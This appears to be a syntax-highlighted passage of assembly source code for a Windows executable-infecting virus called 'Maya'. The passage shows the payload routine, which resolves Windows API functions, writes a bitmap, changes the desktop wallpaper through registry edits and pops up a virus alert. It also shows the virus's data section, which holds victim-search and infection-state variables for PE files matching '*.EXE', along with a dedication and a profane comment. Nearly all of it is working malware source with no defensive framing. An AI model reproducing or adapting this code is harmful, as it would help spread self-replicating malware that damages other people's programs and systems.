    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_advapi32</span><span class="sc0">        </span><span class="sc1">;ptr to 'ADVAPI32.dll' string</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getmodhand</span><span class="sc0">            </span><span class="sc1">;get hModule</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_payload_return</span><span class="sc0">          </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_a32hand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;store hModule  </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_regopenkeyexa</span><span class="sc0">   </span><span class="sc1">;get ptr</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_a32hand</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get handle to advapi32</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getprocadd</span><span class="sc0">            </span><span class="sc1">;get add of RegOpenKeyExA fn</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_payload_return</span><span class="sc0">          </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_regopenkeyexa_add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;store add</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;now gets the address of 3 more fn's:RegSetVauleExA,MessageBoxA,</span><span class="sc0">
</span><span class="sc1">;and SystemParametersInfo.It is identical to the method above,</span><span class="sc0">
</span><span class="sc1">;so i dont waste time commenting it</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_regsetvalueexa</span><span class="sc0">  </span><span class="sc1">;asciiz of fn</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_a32hand</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getprocadd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_payload_return</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_regsetvalueexa_add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;store add</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_messageboxa</span><span class="sc0">     </span><span class="sc1">;asciiz of fn</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_u32hand</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getprocadd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_payload_return</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_messageboxa_add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;store add</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_sysparam</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_u32hand</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get handle to user32.dll</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getprocadd</span><span class="sc0">        </span><span class="sc1">;call fn</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_payload_return</span><span class="sc0">      </span><span class="sc1">;yes abort</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;creates the .bmp file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_sysparam_add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;hTemplate is null</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">;attribute normal</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">;create always,overwrite if exists</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;no security attrs struct,so we pass null</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;share_read</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">      </span><span class="sc1">;generic write access</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_slamfilename</span><span class="sc1">;ptr to filename</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;ptr to filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_createfilea_add</span><span class="sc4">]</span><span class="sc1">;get fn add</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call CreateFileA()</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_payload_return</span><span class="sc0">          </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_slamhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;store handle   </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;null as overlapped ptr to WriteFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_numberofwritten</span><span class="sc0"> </span><span class="sc1">;add of room</span><span class="sc0">
                        </span><span class="sc1">;for # of written bytes</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;plus delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store parameter</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">slam_len</span><span class="sc0">         </span><span class="sc1">;length of .bmp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">slam</span><span class="sc0">         </span><span class="sc1">;ptr to .bmp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;plus delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store parameter</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_slamhandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;store handle for WriteFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_writefile_add</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get add of fn</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call fn</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_slamhandle</span><span class="sc4">]</span><span class="sc1">;push handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_closehandle_add</span><span class="sc4">]</span><span class="sc1">;get fn add</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call fn</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;registry manipulations to modify wallpaper</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_reg</span><span class="sc0">         </span><span class="sc1">;address of result</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;desired access:KEY_SET_VALUE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;reserved,must be null</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_cpd</span><span class="sc0">         </span><span class="sc1">;ptr to 'Control Panel\Desktop'</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">              </span><span class="sc1">;HKEY_CURRENT_USER</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_regopenkeyexa_add</span><span class="sc4">]</span><span class="sc1">;get fn address</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call RegOpenKeyExA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;size of value data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_one</span><span class="sc0">         </span><span class="sc1">;'1' character</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;type of data:1=zero terminated</span><span class="sc0">
                        </span><span class="sc1">;string</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;reserved,must be null</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_tilewallpaper</span><span class="sc0">   </span><span class="sc1">;ptr to 'Tilewallpaper'</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;value name to set</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_reg</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;hKey</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_regsetvalueexa_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call fn</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;size of value data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_zero</span><span class="sc0">        </span><span class="sc1">;'0' character</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;data type</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;reserved</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_wallpaperstyle</span><span class="sc0">  </span><span class="sc1">;ptr to value name</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_reg</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;hKey</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_regsetvalueexa_add</span><span class="sc4">]</span><span class="sc1">;get fn add</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call fn</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_slamfilename</span><span class="sc0">    </span><span class="sc1">;file containing .bmp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">                </span><span class="sc1">;SPI_SETDESKWALLPAPER</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_sysparam_add</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get fn add</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call fn:update desktop</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;messagebox</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">                </span><span class="sc1">;MB_OK+MB_ICONEXCLAMATION style</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_viralert</span><span class="sc0">        </span><span class="sc1">;title of msgbox</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_mayamsg</span><span class="sc0">     </span><span class="sc1">;ptr to msg of msgbox</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;hWnd of caller (virus)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_messageboxa_add</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get fn add</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call MessageBox fn</span><span class="sc0">
</span><span class="sc5">maya_payload_return</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return to caller</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;data related to virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">maya_msg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'To Aparna S. : Forever in love with you...'</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;fuck all the motherfucking bitches</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">maya_addof_k32</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;address of KERNEL32.dll module</span><span class="sc0">
</span><span class="sc5">maya_imagebase</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;imagebase of host @18FC</span><span class="sc0">
</span><span class="sc5">maya_windir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;room for Windows directory ASCIIZ string @1900</span><span class="sc0">
</span><span class="sc5">maya_currdir</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;room for current directory ASCIIZ string @1980</span><span class="sc0">
</span><span class="sc5">maya_systime</span><span class="sc0">    </span><span class="sc5">win32systime</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc1">;win32 system time structure @1A00</span><span class="sc0">
</span><span class="sc5">maya_finddata</span><span class="sc0"> </span><span class="sc5">_find_data</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">    </span><span class="sc1">;finddata structure for file searches @1A10</span><span class="sc0">


</span><span class="sc5">maya_fileattrib</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;attribute of victim @1B58</span><span class="sc0">
</span><span class="sc5">maya_successfull_infection</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;flag that indicates the infection</span><span class="sc0">
                    </span><span class="sc1">;routines completed operation @1B5C</span><span class="sc0">
</span><span class="sc5">maya_infection_counter</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;counter of infections @1B60</span><span class="sc0">
</span><span class="sc5">maya_eat</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;export address table</span><span class="sc0">
</span><span class="sc5">maya_expnames</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;exported names</span><span class="sc0">
</span><span class="sc5">maya_eord</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;exports ordinals</span><span class="sc0">
</span><span class="sc5">maya_ilt</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;import lookup table rva</span><span class="sc0">


</span><span class="sc5">maya_findhandle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;handle used in file searches</span><span class="sc0">
</span><span class="sc5">maya_filemask</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;filemask used to find victims @1B51</span><span class="sc0">

</span><span class="sc5">maya_filesize_high_dword</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;hi dword of filesize @1B74</span><span class="sc0">
</span><span class="sc5">maya_filesize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;lo dword of filesize @1B78</span><span class="sc0">
</span><span class="sc5">maya_handle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;handle of file being infected  @1B7C</span><span class="sc0">
</span><span class="sc5">maya_maphandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;handle of filemapping object   @1B80</span><span class="sc0">
</span><span class="sc5">maya_mappedadd</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;address where file is mapped   @1B84</span><span class="sc0">
</span><span class="sc5">maya_peptr</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;PE head ptr            @1B88</span><span class="sc0">
</span><span class="sc5">maya_ptrtolastsection</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;ptr to last entry in section table @1B8C</span><span class="sc0">
